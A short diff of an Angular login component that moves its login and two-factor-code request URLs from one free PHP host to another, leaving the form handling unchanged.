@@ -39,7 +39,7 @@ export class EntrarComponent {
   login() {
     if (this.registerForm.valid) {
       console
-      const url = 'https://proteccloud.000webhostapp.com/entrar.php';
+      const url = 'https://dasapp.alwaysdata.net/entrar.php';
       const body = { 
         username: this.registerForm.get('username')?.value, 
         password: this.registerForm.get('password')?.value 
@@ -91,7 +91,7 @@ export class EntrarComponent {
     this.cont++;
     if (this.registerForm2.valid && this.cont<3) {
       console
-      const url = 'https://proteccloud.000webhostapp.com/code.php';
+      const url = 'https://dasapp.alwaysdata.net/code.php';
       const body = { 
         username: this.registerForm.get('username')?.value, 
         fa: this.registerForm2.get('fa')?.value, 
